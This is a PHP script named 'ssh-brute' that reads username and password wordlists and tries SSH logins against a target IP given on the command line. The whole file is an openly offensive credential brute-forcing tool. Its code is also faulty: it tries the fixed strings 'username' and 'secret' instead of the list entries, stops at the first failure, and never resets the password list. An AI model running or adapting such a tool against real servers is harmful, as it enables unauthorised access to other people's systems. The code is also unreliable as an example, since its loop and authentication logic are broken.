<?php
//ssh-brute
//brute forces ssh server login

/* Notify the user if the server terminates the connection */
function my_ssh_disconnect($reason, $message, $language) {
  printf("Server disconnected with reason code [%d] and message: %s\n",
         $reason, $message);
}

$methods = array(
  'kex' => 'diffie-hellman-group1-sha1',
  'client_to_server' => array(
    'crypt' => '3des-cbc',
    'comp' => 'none'),
  'server_to_client' => array(
    'crypt' => 'aes256-cbc,aes192-cbc,aes128-cbc',
    'comp' => 'none'));

$callbacks = array('disconnect' => 'my_ssh_disconnect');
error_reporting(E_ERROR | E_PARSE);


$target = $argv[1];
if (strlen($target) > 0){
echo "targeting: " . $target . PHP_EOL;
}
else {
echo "usage: php ssh-brute.php <ip>" . PHP_EOL;
exit(1);
}


$user_file = fopen("ssh-usr.txt", "r");
$pass_file = fopen("ssh-pwd.txt", "r");

while(!feof($user_file)) { 
    $user = fgets($user_file);

    while (!feof($pass_file)) {
        echo "trying user: " . $user;
        $pass = fgets($pass_file);
        echo "with pass: " . $pass . PHP_EOL;
        $connection = ssh2_connect($target, 22, $methods, $callbacks);

        if (!$connection){
            echo "connection failed... retrying with delay" . PHP_EOL;
            sleep(60);
            continue;
        } 
        else {
            echo "connection made....bruteforcing" . PHP_EOL;
            sleep(2);
            if (ssh2_auth_password($connection, 'username', 'secret')) {
                echo "[+]Authentication Successful!\n" . PHP_EOL;
                break;
              } else {
                die('[-]Authentication Failed...');
              }
        }
    }
}

fclose($user_file);
fclose($pass_file);


?>
